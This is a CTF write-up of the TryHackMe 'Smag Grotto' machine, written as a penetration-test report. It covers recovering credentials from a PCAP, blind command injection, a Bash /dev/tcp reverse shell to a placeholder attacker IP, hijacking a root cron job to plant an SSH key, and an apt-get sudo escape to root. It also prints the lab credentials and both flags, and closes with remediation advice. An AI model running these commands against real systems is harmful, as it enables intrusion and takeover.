# Security Assessment Report - Smag Grotto (TryHackMe)

**Analyst:** Felipe Campolina  
**Role:** Cybersecurity Analyst / Penetration Tester  
**Date:** June 2026  
**Platform:** TryHackMe  
**Difficulty:** Easy  
**Challenge URL:** https://tryhackme.com/room/smaggrotto  

---

## Executive Summary

This report documents the complete compromise of the **Smag Grotto** machine on TryHackMe. The assessment began with network and web enumeration, which exposed a packet capture through a public mail directory. Analysis of the unencrypted HTTP traffic revealed valid helpdesk credentials and a development virtual host.

After authentication, a blind OS command injection vulnerability provided an initial shell as `www-data`. A writable SSH public-key backup, combined with a root cron job, enabled lateral privilege escalation to the `jake` account. Finally, an overly permissive `sudo` rule for `apt-get` allowed arbitrary command execution as root.

**Key Findings:**

- **Critical:** Authenticated OS command injection in `admin.php`
- **Critical:** Writable SSH key backup processed by a root cron job
- **Critical:** Passwordless `sudo` access to `apt-get`
- **High:** Credentials transmitted in cleartext and exposed through a public PCAP file
- **Medium:** Development virtual host exposed to untrusted clients

**Impact:** Complete system compromise, including access to both the user and root flags.

> TryHackMe target addresses are assigned dynamically. Replace `<TARGET_IP>` and `<ATTACKER_IP>` with the addresses from the active lab session.

---

## Objective

- Enumerate the target's network services and web application.
- Discover and analyze exposed application artifacts.
- Obtain valid credentials and access the development application.
- Exploit command injection to gain an initial shell.
- Escalate from `www-data` to `jake` through SSH key injection.
- Abuse delegated `apt-get` privileges to obtain root access.
- Retrieve the user and root flags.

---

## Methodology

1. Network and service enumeration with Nmap
2. Web technology and vulnerability enumeration with WhatWeb and Nikto
3. Public file discovery and Base64 path analysis
4. Packet capture analysis with TShark
5. Virtual-host configuration and authenticated application testing
6. Blind command injection and reverse-shell delivery
7. Local enumeration and root cron-job abuse
8. SSH key injection and access as `jake`
9. Sudo enumeration and `apt-get` privilege escalation

---

## Step-by-Step Walkthrough

### 1. Initial Reconnaissance

#### Full TCP Scan

```bash
nmap -sC -sV -p- <TARGET_IP> -oN nmap_full.txt
```

**Discovered services:**

```text
22/tcp open  ssh
80/tcp open  http
```

Only SSH and HTTP were exposed, making the web application the primary attack surface.

#### HTTP Service Identification

```bash
curl -I http://<TARGET_IP>
whatweb http://<TARGET_IP>
```

**Results:**

```text
Apache/2.4.18 (Ubuntu)
Title: Smag
```

#### Web Server Enumeration

```bash
nikto -h http://<TARGET_IP>
```

Nikto identified an accessible directory:

```text
/mail/
```

---

### 2. Mail Directory and PCAP Discovery

Browsing to the following location exposed a mail page:

```text
http://<TARGET_IP>/mail/
```

The page referenced an attachment using Base64-encoded path components:

```html
<a href="../aW1wb3J0YW50/dHJhY2Uy.pcap">dHJhY2Uy.pcap</a>
```

The directory and filename were decoded locally:

```bash
echo 'aW1wb3J0YW50' | base64 -d
# important

echo 'dHJhY2Uy' | base64 -d
# trace2
```

The application stated that attachments must be downloaded with `wget`:

```bash
wget http://<TARGET_IP>/aW1wb3J0YW50/dHJhY2Uy.pcap
file dHJhY2Uy.pcap
```

**Result:**

```text
pcap capture file
```

Base64 encoding provided only obscurity; it did not prevent access to the sensitive capture.

---

### 3. Packet Capture Analysis

The capture was inspected with TShark:

```bash
tshark -r dHJhY2Uy.pcap
tshark -r dHJhY2Uy.pcap -Y 'http.request.method == POST' -V
```

An HTTP POST request to `/login.php` exposed the following data in cleartext:

```text
Host: development.smag.thm
username=helpdesk
password=cH4nG3M3_n0w
```

**Credentials recovered:**

- **Username:** `helpdesk`
- **Password:** `cH4nG3M3_n0w`
- **Virtual host:** `development.smag.thm`

This demonstrated the risk of transmitting authentication data over unencrypted HTTP and retaining sensitive packet captures in a public web directory.

---

### 4. Development Virtual Host Access

The hostname was mapped to the current target address:

```bash
echo '<TARGET_IP> development.smag.thm' | sudo tee -a /etc/hosts
```

The recovered credentials successfully authenticated at:

```text
http://development.smag.thm/login.php
```

After login, the application redirected to `admin.php`, which contained an **Enter a command** form. The `command` parameter was identified as a blind OS command injection point.

---

### 5. Blind Command Injection

To verify command execution, an HTTP server was started on the attacking machine:

```bash
python3 -m http.server 8000
```

The following value was submitted through the `command` parameter:

```text
curl http://<ATTACKER_IP>:8000/proof
```

The incoming request confirmed execution on the target:

```text
GET /proof
```

**Vulnerability:** OS Command Injection  
**Classification:** CWE-78  
**Risk:** Critical  
**Impact:** Remote command execution in the web-server context

---

### 6. Reverse Shell as `www-data`

A Netcat listener was started locally:

```bash
nc -lvnp 4444
```

The vulnerable form was then used to execute a Bash reverse shell:

```bash
bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'
```

The callback provided a shell as the web-service account:

```bash
id
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

### 7. Local Enumeration

The home directories were reviewed:

```bash
ls -la /home
ls -la /home/jake
```

The `jake` account and its user flag were discovered, but `www-data` could not read the file:

```text
-rw-rw---- 1 jake jake ... user.txt
```

Linux capabilities were also enumerated:

```bash
getcap -r / 2>/dev/null
```

The following unusual capability assignment was found:

```text
/usr/bin/systemd-detect-virt = cap_dac_override,cap_sys_ptrace+ep
```

Further investigation showed that this was not the intended privilege-escalation path.

---

### 8. Root Cron Job Abuse

Local enumeration revealed a root cron job that ran every minute:

```cron
* * * * * root /bin/cat /opt/.backups/jake_id_rsa.pub.backup > /home/jake/.ssh/authorized_keys
```

The source file `/opt/.backups/jake_id_rsa.pub.backup` was writable by `www-data`. Consequently, an attacker-controlled public key placed in this file would be copied by root into Jake's `authorized_keys` file.

#### Generate an SSH Key Pair

On the attacking machine:

```bash
ssh-keygen -t rsa -f thm_jake
```

This generated:

```text
thm_jake
thm_jake.pub
```

#### Replace the Backup Public Key

From the compromised target shell:

```bash
echo '<YOUR_PUBLIC_KEY>' > /opt/.backups/jake_id_rsa.pub.backup
cat /opt/.backups/jake_id_rsa.pub.backup
```

After the cron job ran, the injected key became authorized for Jake's SSH account.

**Vulnerability:** Improper permission assignment for a critical resource  
**Classification:** CWE-732  
**Risk:** Critical  
**Impact:** Unauthorized access as `jake`

---

### 9. SSH Access as Jake

After waiting approximately one minute for the cron job:

```bash
chmod 600 thm_jake
ssh -i thm_jake jake@<TARGET_IP>
```

The user flag was then retrieved:

```bash
cat /home/jake/user.txt
# iusGorV7EbmxM5AuIe2w499msaSuqU3
```

---

### 10. Privilege Escalation to Root

Jake's delegated privileges were enumerated:

```bash
sudo -l
```

**Result:**

```text
(root) NOPASSWD: /usr/bin/apt-get
```

Because APT supports pre-invoke hooks, the permitted binary could execute an arbitrary command before processing an update:

```bash
sudo apt-get update -o APT::Update::Pre-Invoke=/bin/sh
```

This spawned a root shell:

```bash
whoami
# root
```

**Vulnerability:** Improper privilege management  
**Classification:** CWE-269  
**Risk:** Critical  
**Impact:** Complete system compromise

---

### 11. Root Flag

```bash
cat /root/root.txt
# uJr6zRgetaniyHVRqqL58uRasybBKz2T
```

---

## Results

- **User flag:** `iusGorV7EbmxM5AuIe2w499msaSuqU3`
- **Root flag:** `uJr6zRgetaniyHVRqqL58uRasybBKz2T`
- **Initial access:** `www-data` through authenticated command injection
- **Lateral escalation:** `www-data` to `jake` through cron-based SSH key injection
- **Privilege escalation:** `jake` to `root` through passwordless `apt-get`

---

## Attack Chain

```text
Nmap / Web Enumeration
        |
        v
Public /mail/ Directory
        |
        v
Exposed PCAP Attachment
        |
        v
Cleartext Helpdesk Credentials
        |
        v
development.smag.thm Login
        |
        v
Blind OS Command Injection
        |
        v
Reverse Shell as www-data
        |
        v
Writable SSH Key Backup + Root Cron Job
        |
        v
SSH Access as jake
        |
        v
Passwordless sudo apt-get
        |
        v
Root Shell
```

---

## Summary of Findings

| Phase | Technique | Result |
| --- | --- | --- |
| Reconnaissance | Nmap, WhatWeb, Nikto | Identified SSH, Apache, and `/mail/` |
| Information disclosure | Public attachment analysis | Downloaded an exposed PCAP file |
| Credential discovery | TShark HTTP analysis | Recovered helpdesk credentials and virtual host |
| Initial access | Blind command injection | Obtained a shell as `www-data` |
| User escalation | Cron job and SSH key injection | Obtained SSH access as `jake` |
| Root escalation | `sudo apt-get` hook abuse | Obtained a root shell |
| Collection | File access | Retrieved both flags |

---

## Comprehensive Vulnerability Assessment

| Vulnerability | Classification | Risk | Impact |
| --- | --- | --- | --- |
| Authenticated OS command injection | CWE-78 | Critical | Remote command execution |
| Writable file consumed by a root cron job | CWE-732 | Critical | Unauthorized access as `jake` |
| Passwordless sudo access to `apt-get` | CWE-269 | Critical | Root privilege escalation |
| Credentials exposed in cleartext PCAP data | CWE-319 | High | Account compromise |
| Sensitive PCAP exposed through the web server | CWE-200 | High | Disclosure of credentials and internal hostnames |
| Exposed development virtual host | CWE-668 | Medium | Increased attack surface |

---

## Tools Used

- **Nmap** - Port scanning and service detection
- **cURL** - HTTP header inspection and command-injection verification
- **WhatWeb** - Web technology fingerprinting
- **Nikto** - Web server enumeration
- **wget** - Attachment retrieval
- **TShark** - Packet capture and HTTP request analysis
- **Python HTTP server** - Out-of-band command-execution verification
- **Netcat** - Reverse-shell listener
- **OpenSSH** - Key generation and remote access
- **GTFOBins methodology** - Identification of the `apt-get` sudo escape

---

## Remediation Recommendations

### Immediate Actions

1. **Eliminate OS Command Injection**
   - Do not pass user-controlled input to a shell.
   - Replace shell commands with safe, purpose-built APIs.
   - Apply strict allowlist validation if command execution is unavoidable.
   - Run the web service under a minimally privileged, isolated account.

2. **Remove Sensitive Files from the Web Root**
   - Delete packet captures, backups, logs, and internal correspondence from public directories.
   - Review web content for previously exposed secrets.
   - Rotate all credentials present in the capture.

3. **Protect Authentication Traffic**
   - Enforce HTTPS for every authentication endpoint.
   - Redirect HTTP to HTTPS and enable HSTS.
   - Invalidate exposed sessions and passwords.

4. **Secure the Cron Workflow**
   - Ensure root cron jobs never consume files writable by lower-privileged users.
   - Restrict the backup file to root ownership and permissions.
   - Validate file ownership, mode, and content before copying security-sensitive data.

5. **Remove Dangerous Sudo Permissions**
   - Remove `NOPASSWD` access to `/usr/bin/apt-get`.
   - Delegate only narrowly scoped commands that cannot invoke shells or hooks.
   - Audit the complete sudo policy regularly.

### Long-Term Improvements

1. Segment development applications from production-facing networks.
2. Monitor changes to `authorized_keys`, cron files, and sudo policies.
3. Apply current operating-system and Apache security updates.
4. Introduce centralized secret management and credential rotation.
5. Conduct periodic reviews of file permissions and privileged automation.

---

## Conclusion & Lessons Learned

Smag Grotto demonstrates how several individually preventable weaknesses can form a complete compromise chain. A publicly accessible packet capture disclosed credentials, those credentials unlocked a command-injection flaw, and insecure privileged automation enabled movement from the web account to a local user. Finally, an unsafe sudo rule converted user access into full root control.

The central lesson is that privileged processes must never trust files controlled by less-privileged accounts. Sensitive traffic captures should also be treated like credentials: stored outside the web root, access-controlled, and removed when no longer required.

**Challenge Rating:** 4/5 (Excellent practice for packet analysis, command injection, cron abuse, and Linux privilege escalation)

---

*This report documents authorized activity performed in a controlled TryHackMe environment for educational purposes only.*
